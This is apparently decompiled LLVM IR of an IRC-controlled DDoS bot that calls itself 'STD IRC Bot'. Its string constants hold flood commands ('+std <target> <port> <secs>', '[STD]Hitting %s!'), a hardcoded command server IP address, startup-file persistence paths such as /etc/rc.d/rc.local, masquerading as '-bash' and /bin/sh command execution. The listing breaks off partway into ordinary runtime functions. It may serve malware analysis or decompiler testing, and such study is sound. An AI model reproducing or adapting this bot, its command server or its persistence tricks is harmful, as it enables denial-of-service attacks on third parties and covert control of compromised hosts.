source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%3 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r12 = internal unnamed_addr global i32 0
@r16 = internal unnamed_addr global i32 0
@r17 = internal unnamed_addr global i32 0
@r18 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@global_var_10030000.11 = global i32 0
@global_var_100279dc.13 = global i32 0
@global_var_10027a04.14 = local_unnamed_addr global i32* @global_var_100279dc.13
@global_var_1002c3fc.17 = global i32 0
@global_var_100279e0.18 = global i32 0
@global_var_1002c414.19 = global i32 0
@global_var_1002c2f0.20 = global i32 0
@global_var_1002c300.21 = local_unnamed_addr global i32 0
@global_var_100159b8.22 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_10000814.23 = constant [3 x i8] c"8`\00"
@global_var_100159dc.25 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_100008b8.26 = constant i32 939524097
@global_var_1002c2ec.27 = local_unnamed_addr global i32 0
@global_var_1002c318.28 = local_unnamed_addr global i32 0
@global_var_100159fc.29 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_10015a0c.30 = constant i32 1912602624
@global_var_1002c2f4.31 = local_unnamed_addr global i32 0
@global_var_10015a10.32 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_1000103c.33 = constant [3 x i8] c"8`\00"
@global_var_1002c314.34 = local_unnamed_addr global i32 0
@global_var_10015a2c.35 = constant [46 x i8] c"PRIVMSG %s :>bot +std <target> <port> <secs>\0A\00"
@global_var_100010ac.36 = constant [3 x i8] c"8`\00"
@global_var_100010b4.37 = constant [3 x i8] c"8`\00"
@global_var_10015a5c.38 = constant [30 x i8] c"PRIVMSG %s :[STD]Hitting %s!\0A\00"
@global_var_10015a7c.39 = constant [4 x i8] c"std\00"
@global_var_10001218.40 = constant [3 x i8] c"8`\00"
@global_var_10015a80.41 = constant [35 x i8] c"PRIVMSG %s :[STD]Done hitting %s!\0A\00"
@global_var_10001274.42 = constant [3 x i8] c"8`\00"
@global_var_1000127c.43 = constant i32 939524096
@global_var_10015aa4.44 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_10015ac4.45 = constant [43 x i8] c"PRIVMSG %s :>bot +unknown <target> <secs>\0A\00"
@global_var_1000146c.46 = constant [3 x i8] c"8`\00"
@global_var_10015af0.47 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_1000150c.48 = constant i32 1208006109
@global_var_10015b10.49 = constant [35 x i8] c"PRIVMSG %s :[UNK]Done hitting %s!\0A\00"
@global_var_1000160c.50 = constant [3 x i8] c"8`\00"
@global_var_100159b0.51 = constant [5 x i8] c"Fine\00"
@global_var_1002c24c.52 = local_unnamed_addr global [5 x i8]* @global_var_100159b0.51
@global_var_1000167c.53 = constant i32 1207959588
@global_var_10015b34.54 = constant [25 x i8] c"PRIVMSG %s :Nice try...\0A\00"
@global_var_10001818.55 = constant i32 939524096
@global_var_1002c2fc.56 = local_unnamed_addr global i32 0
@global_var_10015b80.57 = constant i32 0
@global_var_10015b50.58 = constant [5 x i8] c"+std\00"
@global_var_10027a0c.59 = global [5 x i8]* @global_var_10015b50.58
@global_var_10001bac.60 = constant i32 939524097
@global_var_10015b84.61 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_1002c310.62 = local_unnamed_addr global i32 0
@global_var_10015b94.63 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_10015ba4.64 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_10015bac.65 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1002c2e8.66 = local_unnamed_addr global i32 0
@global_var_10015bb8.67 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_10001fec.68 = constant i32 1207959720
@global_var_10015c18.73 = constant i32 0
@global_var_1002c2dc.74 = local_unnamed_addr global i32 0
@global_var_1002c240.75 = local_unnamed_addr global i32 1
@global_var_100159a0.76 = constant [14 x i8] c"178.156.202.2\00"
@global_var_1002c244.77 = global [14 x i8]* @global_var_100159a0.76
@global_var_1002c308.78 = local_unnamed_addr global i32 0
@global_var_10002294.79 = constant i32 1207959580
@global_var_100022ec.80 = constant [3 x i8] c"8`\00"
@global_var_100023ac.81 = constant i32 1207959668
@global_var_100023e0.82 = constant [3 x i8] c"8`\00"
@global_var_10015c3c.83 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_10015c50.84 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_10015c60.85 = constant i32 788529152
@global_var_10015c64.86 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1000256c.87 = constant i32 1207959620
@global_var_10015c6c.88 = constant i32 1627389952
@global_var_10002614.89 = constant i32 1207959576
@global_var_10002620.90 = constant i32 1207959564
@global_var_1000262c.91 = constant i32 1207961629
@global_var_10015c70.92 = constant [6 x i8] c"-bash\00"
@global_var_10002674.93 = constant i32 939524097
@global_var_10015c78.94 = constant [4 x i8] c"STD\00"
@global_var_10015c7c.95 = constant [12 x i8] c"STD IRC Bot\00"
@global_var_10015c88.97 = constant i32 587202560
@global_var_1002c2f8.98 = local_unnamed_addr global i32 0
@global_var_10015c8c.99 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_10015c98.100 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_10002828.101 = constant i32 1207959556
@global_var_10015cc4.102 = constant i32 167772160
@global_var_10002c10.103 = constant i32 1207959568
@global_var_10002cb8.104 = constant i32 939524096
@global_var_10015c1c.105 = constant [4 x i8] c"352\00"
@global_var_10027a34.106 = global [4 x i8]* @global_var_10015c1c.105
@global_var_10015cc8.107 = constant [6 x i8] c"ERROR\00"
@global_var_1002c814.108 = global i32 0
@global_var_1002c31c.109 = global i32 0
@global_var_1002c320.110 = global i32 0
@global_var_1002c324.111 = global i32 0
@global_var_10002e8c.112 = constant i32 1207974477
@global_var_10030c78.113 = global i32 0
@global_var_10030b4c.114 = global i32 0
@global_var_10002eb0.115 = constant i32 1207982877
@global_var_10002f38.116 = constant i32 1207963277
@global_var_10002f3c.117 = constant i32 1207970217
@global_var_10002f40.118 = constant i32 1207973753
@global_var_10002f60.119 = constant i32 1207974021
@global_var_10003020.120 = constant i32 939524096
@global_var_100036e8.121 = constant i32 1207982421
@global_var_10027ef8.122 = local_unnamed_addr global [3 x i32] %wide-string
@global_var_10027efc.123 = local_unnamed_addr global i32 64
@global_var_1002c340.124 = local_unnamed_addr global i32 0
@global_var_1002c278.125 = local_unnamed_addr global i32 32
@global_var_10003c3c.126 = constant [3 x i8] c"9 \00"
@global_var_10003cd0.127 = constant i32 939524096
@global_var_1002c258.128 = local_unnamed_addr global i32 -1
@global_var_1002c254 = external local_unnamed_addr global i32
@global_var_10027a80 = external global i32
@global_var_10027c74.129 = local_unnamed_addr global i32 0
@global_var_10003d9c.130 = constant i32 939524096
@global_var_1002c32c.131 = local_unnamed_addr global i32 0
@global_var_1002c330.132 = local_unnamed_addr global i32 0
@global_var_1002c348.133 = local_unnamed_addr global i32 0
@global_var_1002c37c.134 = global i32 0
@global_var_1002c378.135 = global i32 0
@global_var_10003e88.136 = constant [3 x i8] c"8a\00"
@global_var_1002c27c.137 = local_unnamed_addr global i32 33
@global_var_1002c280.138 = local_unnamed_addr global i32 34
@global_var_1002c328.139 = local_unnamed_addr global i32 0
@global_var_1002c2bc.141 = global i32* bitcast (i16* @global_var_1002bf30.140 to i32*)
@global_var_1002c2c0.142 = local_unnamed_addr global i32 2
@global_var_10027ac4.143 = local_unnamed_addr global i32* @global_var_1002c378.135
@global_var_10027a94.144 = local_unnamed_addr global i32 0
@global_var_10027acc.145 = local_unnamed_addr global i32* @global_var_1002c37c.134
@global_var_10003f94.146 = constant i32 1207979025
@global_var_10003f98.147 = constant i32 1006632992
@global_var_1002c33c.148 = local_unnamed_addr global i32 0
@global_var_1002c39c.149 = local_unnamed_addr global i32 0
@global_var_10004114.150 = constant i32 939589631
@global_var_10004154.151 = constant i32 1207959808
@global_var_1002c344.152 = local_unnamed_addr global i32 0
@global_var_10027c1c.153 = local_unnamed_addr global i32 0
@global_var_1002c35c.154 = local_unnamed_addr global i32 0
@global_var_10027c20.155 = local_unnamed_addr global i32 0
@global_var_10027c60.156 = global i32 0
@global_var_10027f10.157 = global i32 0
@global_var_10027c7c.158 = local_unnamed_addr global i32* @global_var_10027f10.157
@global_var_10027e0c.159 = local_unnamed_addr global i32 0
@global_var_10027e08.160 = local_unnamed_addr global i32 0
@global_var_10027c70.161 = local_unnamed_addr global i32 0
@global_var_1002c364.162 = local_unnamed_addr global i32 0
@global_var_10004254.163 = constant i32 939589631
@global_var_1002c368.164 = local_unnamed_addr global i32 0
@global_var_100042b4.165 = constant i32 939524101
@global_var_10027f20.166 = global i32 0
@global_var_10004488.167 = constant i32 1207959700
@global_var_1002c334.168 = local_unnamed_addr global i32 0
@global_var_1002c338.169 = local_unnamed_addr global i32 0
@global_var_10027f00.170 = global i32 0
@global_var_100045bc.171 = constant [3 x i8] c"8`\00"
@global_var_10004680.172 = constant [3 x i8] c"8`\00"
@global_var_100046e0.173 = constant [3 x i8] c"8`\00"
@global_var_10004844.174 = constant i32 1006632992
@global_var_1000490c.175 = constant [3 x i8] c"8`\00"
@global_var_10004974.176 = constant [3 x i8] c"9 \00"
@global_var_100049f0.177 = constant [3 x i8] c"8`\00"
@global_var_10004a54.178 = constant [3 x i8] c"8`\00"
@global_var_10004a84.179 = constant i32 1207959648
@global_var_10004ad0.180 = constant i32 1207959572
@global_var_10004ae4.181 = constant [3 x i8] c"8`\00"
@global_var_10004b5c.182 = constant [3 x i8] c"8`\00"
@global_var_10004ee8.183 = constant i32 939524096
@global_var_10004efc.184 = constant i32 1207959592
@global_var_10005030.185 = constant i32 1207959756
@global_var_1000511c.186 = constant [3 x i8] c"8`\00"
@global_var_10005140.187 = constant [3 x i8] c"8`\00"
@global_var_10005220.188 = constant i32 1207959692
@global_var_100052d4.189 = constant [3 x i8] c"8`\00"
@global_var_1000548c.190 = constant i32 1207969745
@global_var_100054dc.191 = constant i32 939524097
@global_var_10005560.192 = constant [3 x i8] c"8`\00"
@global_var_10005568.193 = constant [3 x i8] c"8`\00"
@global_var_100055dc.194 = constant [3 x i8] c"8`\00"
@global_var_100055f8.195 = constant [3 x i8] c"8`\00"
@global_var_10005620.196 = constant [3 x i8] c"8`\00"
@global_var_10005828.197 = constant [3 x i8] c"8`\00"
@global_var_10005844.198 = constant [3 x i8] c"8`\00"
@global_var_10005860.199 = constant i32 1207959660
@global_var_10027c78.200 = local_unnamed_addr global i32 0
@global_var_1002c34c.201 = local_unnamed_addr global i32 0
@global_var_1002c350.202 = local_unnamed_addr global i32 0
@global_var_10005c18.203 = constant i32 939524096
@global_var_1002c294.204 = local_unnamed_addr global i32 2
@global_var_10005df4.206 = constant [3 x i8] c"8`\00"
@global_var_10027ca8.207 = global i32 0
@global_var_10027cb0.208 = global i32 0
@global_var_10027cac.209 = local_unnamed_addr global i32 0
@global_var_10027ca4.210 = local_unnamed_addr global i32* @global_var_10027ca8.207
@global_var_10005eac.211 = constant [3 x i8] c"8`\00"
@global_var_10005ecc.212 = constant [3 x i8] c":!\00"
@global_var_10005f30.213 = constant i32 1207960936
@global_var_10015cd0.214 = constant i32 -64820
@global_var_1002c358.215 = local_unnamed_addr global i32 0
@global_var_1002c354.216 = local_unnamed_addr global i32 0
@global_var_100061ec.217 = constant i32 1207959580
@global_var_10006368.218 = constant i32 1023414275
@global_var_1000653c.220 = constant [3 x i8] c"9 \00"
@global_var_1002c82c.221 = global i32 0
@global_var_1002c844.222 = global i32 0
@global_var_1002c36c.223 = local_unnamed_addr global i32 0
@global_var_10006798.224 = constant [3 x i8] c"9 \00"
@global_var_10006844.225 = constant i32 1207959676
@global_var_10006878.226 = constant i32 939524096
@global_var_100068a8.227 = constant [3 x i8] c"8`\00"
@global_var_100068c0.228 = constant [3 x i8] c"8`\00"
@global_var_100069cc.229 = constant i32 2080375980
@global_var_10006a38.230 = constant i32 939524096
@global_var_10006bb0.231 = constant [3 x i8] c"8`\00"
@global_var_10006be8.232 = constant i32 939524096
@global_var_10006e58.233 = constant i32 939524134
@global_var_10006e84.234 = constant i32 939524134
@global_var_10006eb0.235 = constant i32 939524134
@global_var_10006eec.236 = constant i32 939524112
@global_var_10006f3c.237 = constant i32 939524107
@global_var_10007044.238 = constant i32 1207959792
@global_var_100071e0.239 = constant i32 1207959912
@global_var_100073ac.240 = constant i32 939524130
@global_var_100073d4.241 = constant i32 1207959704
@global_var_100073ec.242 = constant i32 939524097
@global_var_10007400.243 = constant i32 1207959660
@global_var_10007424.244 = constant i32 939524107
@global_var_1002c850.245 = global i32 0
@global_var_100076ac.246 = constant [3 x i8] c"8`\00"
@global_var_100078d4.247 = constant i32 1207959700
@global_var_100079e4.248 = constant [3 x i8] c"8`\00"
@global_var_1002c954.249 = global i32 0
@global_var_10007a74.250 = constant [3 x i8] c"9@\00"
@global_var_1002e954.251 = global i32 0
@global_var_10007ad8.252 = constant i32 939525121
@global_var_10007b0c.254 = constant [3 x i8] c"8`\00"
@global_var_10007b3c.255 = constant [3 x i8] c"8`\00"
@global_var_10007ba8.256 = constant [3 x i8] c"8`\00"
@global_var_10007c10.257 = constant [3 x i8] c"8`\00"
@global_var_10007cc4.258 = constant i32 956301313
@global_var_10007d34.259 = constant i32 1207959584
@global_var_10007d4c.260 = constant i32 939524096
@global_var_10007e5c.261 = constant i32 1207959572
@global_var_10007e70.262 = constant i32 939524097
@global_var_1002c374.263 = global i32 0
@global_var_1002c370.264 = local_unnamed_addr global i32 0
@global_var_100080f0.265 = constant i32 2080375980
@global_var_10008188.266 = constant i32 1207959732
@global_var_10008238.267 = constant i32 2080375980
@global_var_100084f0.268 = constant i32 1207959572
@global_var_100085e0.269 = constant i32 1207959572
@global_var_100086d8.270 = constant i32 1207959564
@global_var_10008844.271 = constant i32 1207959812
@global_var_10008b3c.272 = constant i32 1207959560
@global_var_10008d70.273 = constant i32 939589631
@global_var_100093d0.274 = constant i32 939524118
@global_var_1002bf18.278 = global i32 0
@global_var_1002c380.279 = local_unnamed_addr global i32 0
@global_var_100096a4.281 = constant i32 1207965645
@global_var_1000989c.282 = constant i32 1207960120
@global_var_1002bf00.283 = global i32 0
@global_var_10009ad0.284 = constant i32 1207959560
@global_var_10009b20.285 = constant [3 x i8] c" c\00"
@global_var_10009b3c.286 = constant [3 x i8] c" c\00"
@global_var_10015fe8.287 = constant i32 0
@global_var_10009dd8.288 = constant i32 1207961092
@global_var_10009f04.289 = constant i32 1207960768
@global_var_1001601c.290 = constant i32 269488136
@global_var_10016000.291 = constant [6 x i8] c"(nil)\00"
@global_var_10016008.292 = constant [7 x i8] c"(null)\00"
@global_var_10016010.293 = constant i32 721431808
@global_var_1000a360.294 = constant i32 939524096
@global_var_1001609c.295 = constant i32 65793
@global_var_10016084.296 = constant i32 524293
@global_var_1002c2d0 = external local_unnamed_addr global i32
@global_var_10017056.298 = constant i32 1
@global_var_1001607c.299 = constant [8 x i8] c" +0-#'I\00"
@global_var_10016024.300 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_10016064.301 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_10016058.302 = constant i32 67343
@global_var_10016057.303 = constant i32 50331911
@global_var_10016048.304 = constant i32 268435461
@global_var_10016038.305 = constant i32 520093701
@global_var_1000ad1c.306 = constant [3 x i8] c"8a\00"
@global_var_1000b044.307 = constant i32 1207959708
@global_var_1000b0ec.308 = constant i32 1207959612
@global_var_1000b238.309 = constant i32 939589631
@global_var_1000b2ec.310 = constant i32 939524118
@global_var_100160b8.311 = constant [8 x i8] c"Success\00"
@global_var_100160a8.312 = constant [15 x i8] c"Unknown error \00"
@global_var_1002c2d8.313 = local_unnamed_addr global i32* @global_var_10017056.298
@global_var_1002c388.314 = global i32 0
@global_var_10030b38.315 = global i32 0
@global_var_1003096c.316 = global i32 0
@global_var_1002c210.317 = global i32 0
@global_var_1002c3c8.318 = local_unnamed_addr global i32 0
@global_var_10030d3c.319 = global i32 0
@global_var_1000bd94.320 = constant [3 x i8] c"8`\00"
@global_var_1000be78.321 = constant i32 939524098
@global_var_1000beb8.322 = constant [3 x i8] c"8`\00"
@global_var_1000c254.323 = constant i32 939524118
@global_var_1000c2a0.324 = constant i32 939524118
@global_var_1000c344.325 = constant i32 939524118
@global_var_1000c39c.326 = constant i32 939524097
@global_var_1002c2c4 = external global i32
@global_var_1000c574.329 = constant i32 939524108
@global_var_1000c5c8.330 = constant i32 939524108
@global_var_1000c67c.331 = constant [3 x i8] c"8`\00"
@global_var_1000c728.332 = constant [3 x i8] c"8`\00"
@global_var_1000ca50.333 = constant i32 1207959640
@global_var_1000ca8c.334 = constant i32 1207959580
@global_var_1002c128.335 = global i32 0
@global_var_1002c140 = external global i32
@global_var_1002c160.337 = global i32 -1726662223
@global_var_1002c148.338 = local_unnamed_addr global i32* @global_var_1002c160.337
@global_var_1002c144.339 = global i32* @global_var_1002c160.337
@global_var_10016c14.340 = constant i32 0
@global_var_1000cda4.341 = constant i32 939524118
@global_var_10016c3c.342 = constant [8 x i8] c"/bin/sh\00"
@global_var_10016c44.343 = constant [3 x i8] c"sh\00"
@global_var_10016c48.344 = constant [3 x i8] c"-c\00"
@global_var_1000d0f8.345 = constant [3 x i8] c"8`\00"
@global_var_1000d30c.346 = constant i32 939524130
@global_var_1002c1dc.347 = global i32 0
@global_var_1002c38c.348 = local_unnamed_addr global i32 0
@global_var_1000d3a0.349 = constant i32 1207960457
@global_var_1000d3dc.350 = constant i32 939589631
@global_var_1002c398.351 = local_unnamed_addr global i32 0
@global_var_1002c390.352 = global i32 0
@global_var_100279cc.353 = global i32 -1
@global_var_1002c3a0.354 = local_unnamed_addr global i32 0
@global_var_1002c3a4.355 = local_unnamed_addr global i32 0
@global_var_10016c4c.356 = constant [10 x i8] c"/dev/null\00"
@global_var_1002c3a8.357 = local_unnamed_addr global i32 0
@global_var_1002c394.358 = local_unnamed_addr global i32 0
@global_var_1000dad4.359 = constant i32 939524096
@global_var_1000daf0.360 = constant i32 939524096
@global_var_10030b64.361 = global i32 0
@global_var_1000db40.362 = constant i32 1207959564
@global_var_1000db84.364 = constant i32 1207959564
@global_var_1002c3ac.365 = global i32 0
@global_var_1000dbc0.366 = constant i32 1207959580
@global_var_1000dbf4.368 = constant i32 1207959564
@global_var_1000dc3c.369 = constant i32 1207959608
@global_var_1000dc64.370 = constant i32 1207959564
@global_var_1002c3b8.371 = global i32 0
@global_var_1002c3bc.372 = global i32 0
@global_var_10030d1c.373 = global i32 0
@global_var_10030c90.374 = global i32 0
@global_var_1000ddcc.375 = constant i32 1207965045
@global_var_1000de24.376 = constant i32 1207959564
@global_var_1002c3e8.377 = local_unnamed_addr global i32 0
@global_var_1000e20c.378 = constant i32 939524180
@global_var_1000e528.379 = constant i32 939524105
@global_var_10017280.380 = constant [4 x i8] c"inf\00"
@global_var_10017283.382 = constant i32 4804166
@global_var_10017290.383 = constant i32 771763200
@global_var_1000f414.384 = constant i32 939589631
@global_var_1000f474.385 = constant i32 939589631
@global_var_1000f530.386 = constant i32 939524098
@global_var_100172e0.387 = constant i32 -31784
@global_var_1002c2b0 = external local_unnamed_addr global i32
@global_var_1001731c.388 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_1000f820.389 = constant i32 939524108
@global_var_1002c1f4.390 = global i32 268499604
@global_var_1000f940.391 = constant i32 939524108
@global_var_1000fb00.392 = constant i32 939524099
@global_var_10030d10.393 = global i32 0
@global_var_1000fff4.394 = constant i32 1207959608
@global_var_10030c30.395 = global i32 0
@global_var_1002c3b4.396 = local_unnamed_addr global i32 0
@global_var_10030c48.397 = global i32 0
@global_var_100100b4.398 = constant i32 939524097
@global_var_100101fc.403 = constant i32 1207959576
@global_var_10010228.404 = constant i32 939524096
@global_var_1001734c.405 = constant i32 -28680
@global_var_10017364.406 = constant i32 0
@global_var_10010ab4.407 = constant i32 1207959704
@global_var_10010b28.408 = constant i32 1207959588
@global_var_10010b40.409 = constant i32 1207959564
@global_var_10010b7c.410 = constant i32 1207959564
@global_var_10010ef4.411 = constant i32 1207959560
@global_var_1001737c.412 = constant i32 268505320
@global_var_10017388.413 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_10011234.414 = constant i32 1207959664
@global_var_10011260.415 = constant i32 1207959620
@global_var_100113d0.416 = constant i32 1207959600
@global_var_1001148c.417 = constant i32 1207959560
@global_var_10011528.418 = constant [3 x i8] c"|c\00"
@global_var_1001157c.419 = constant i32 956301313
@global_var_10011628.420 = constant [3 x i8] c"|c\00"
@global_var_1001167c.421 = constant i32 939524097
@global_var_10011714.422 = constant i32 1207959600
@global_var_10011854.423 = constant i32 1207959608
@global_var_1002c3c0.424 = global i32 0
@global_var_100173e4.425 = constant i32 0
@global_var_10011974.426 = constant i32 1207959568
@global_var_10011a20.427 = constant i32 1207959560
@global_var_100173ac.428 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_10011b04.429 = constant i32 1207959620
@global_var_10011b24.430 = constant i32 1207959592
@global_var_10011b30.431 = constant i32 939524096
@global_var_100173c8.432 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_10011c38.433 = constant i32 1207959620
@global_var_10011c6c.434 = constant i32 939524096
@global_var_100173e8.435 = constant i32 268508368
@global_var_10030c60.437 = global i32 0
@global_var_1002c3c4.438 = local_unnamed_addr global i32 0
@global_var_10012090.440 = constant i32 1207960848
@global_var_1002c3cc.441 = local_unnamed_addr global i32 0
@global_var_10017410.442 = constant i32 771751936
@global_var_10030d2c.443 = global i32 0
@global_var_10012180.444 = constant [3 x i8] c"8a\00"
@global_var_1001218c.445 = constant i32 939524097
@global_var_10012260.446 = constant i32 939524097
@global_var_10012334.447 = constant i32 939524097
@global_var_10012360.448 = constant i32 939524100
@global_var_10012440.449 = constant i32 1207959684
@global_var_100125bc.450 = constant i32 939589631
@global_var_1001742c.451 = constant i32 1912602624
@global_var_10017418.452 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_10017430.453 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_10017448.454 = constant [11 x i8] c"nameserver\00"
@global_var_10017454.455 = constant [7 x i8] c"domain\00"
@global_var_1001745c.456 = constant [7 x i8] c"search\00"
@global_var_100128f4.457 = constant i32 1207959568
@global_var_100128fc.458 = constant i32 939524099
@global_var_100129ac.459 = constant i32 939524118
@global_var_10030d48.460 = global i32 0
@global_var_1002c228.461 = global i32 0
@global_var_10012a78.462 = constant i32 939524129
@global_var_1002c3d0.463 = local_unnamed_addr global i32 0
@global_var_10012aec.464 = constant [3 x i8] c"8`\00"
@global_var_10012b24.465 = constant i32 939524129
@global_var_1002c3d8.466 = local_unnamed_addr global i32 0
@global_var_1002c3d4.467 = local_unnamed_addr global i32 0
@global_var_10012ca8.468 = constant i32 1207959580
@global_var_1002c3dc.469 = local_unnamed_addr global i32 0
@global_var_10012d6c.470 = constant i32 939524108
@global_var_1002c3e0.471 = local_unnamed_addr global i32 0
@global_var_1002c3e4.472 = local_unnamed_addr global i32 0
@global_var_10013190.473 = constant i32 939524171
@global_var_10013240.474 = constant i32 939524105
@global_var_10017464.475 = constant i32 268515660
@global_var_10013b10.476 = constant i32 1023414273
@global_var_10013b8c.477 = constant i32 939524098
@global_var_10013ba8.478 = constant i32 939524192
@global_var_10013bcc.480 = constant i32 939524520
@global_var_1002c3ed.481 = global i32 0
@global_var_10017478.482 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_10017490.483 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_10013ce8.484 = constant [3 x i8] c"8`\00"
@global_var_100174c8.485 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_10013d78.486 = constant [3 x i8] c"8`\00"
@global_var_10013da8.487 = constant [3 x i8] c"8`\00"
@global_var_10013f00.492 = constant [3 x i8] c";A\00"
@global_var_100174e0.493 = constant [24 x i8] c"Cannot register service\00"
@global_var_10013fc0.494 = constant i32 939524096
@global_var_1002c3f0.495 = local_unnamed_addr global i32 0
@global_var_10017508.496 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_1001416c.497 = constant i32 1207959664
@global_var_100141d0.498 = constant i32 939524096
@global_var_100142bc.499 = constant [3 x i8] c"8`\00"
@global_var_10017538.500 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_100144b4.501 = constant [3 x i8] c"9 \00"
@global_var_100144c0.502 = constant i32 939524193
@global_var_10014528.504 = constant i32 939524101
@global_var_10014614.505 = constant i32 939524124
@global_var_1001468c.506 = constant i32 1207960116
@global_var_100146a4.507 = constant i32 939524105
@global_var_1001481c.508 = constant [3 x i8] c"9 \00"
@global_var_1001754c.509 = constant [3 x i8] c"%x\00"
@global_var_100148a8.510 = constant i32 939524124
@global_var_100148cc.511 = constant i32 939524193
@global_var_10017550.512 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1001755c.513 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_10014fb8.514 = constant i32 1207959560
@global_var_10017572.515 = constant i32 9587
@global_var_10017570.516 = constant [3 x i8] c": \00"
@global_var_10017574.517 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_10017774.518 = constant i32 0
@global_var_10017804.519 = constant [13 x i8] c"RPC: Success\00"
@global_var_1001757c.520 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_10017598.521 = constant [5 x i8] c"%s: \00"
@global_var_100175a0.522 = constant [4 x i8] c" - \00"
@global_var_10015468.523 = constant i32 1207959608
@global_var_10017624.524 = constant i32 -8052
@global_var_100175a4.525 = constant [13 x i8] c"; errno = %s\00"
@global_var_100155cc.526 = constant i32 1207959776
@global_var_1001760c.533 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_100279d4.534 = global i32 0
@global_var_100279d0.535 = global i32 268451576
@global_var_1002c3f8.12 = local_unnamed_addr global i8 0
@global_var_1002c2e0.24 = local_unnamed_addr global i8 0
@global_var_1002c2e4.69 = external local_unnamed_addr global i8*
@global_var_1002c2e7.70 = external local_unnamed_addr global i8*
@global_var_1002c2e6.71 = external local_unnamed_addr global i8*
@global_var_1002c2e5.72 = external global i8*
@global_var_1002c304.96 = external local_unnamed_addr global i8*
@global_var_1002bf30.140 = global i16 288
@global_var_1002c384.280 = local_unnamed_addr global i16* null
@global_var_1002bf80.276 = local_unnamed_addr global i16 272
@global_var_1002c20c.439 = local_unnamed_addr global i16 1
@global_var_1002c3ec.479 = local_unnamed_addr global i16 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1002c3f8.12, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_10027a04.14 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_10027a04.14 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_10027a04.14 to i32*), align 4
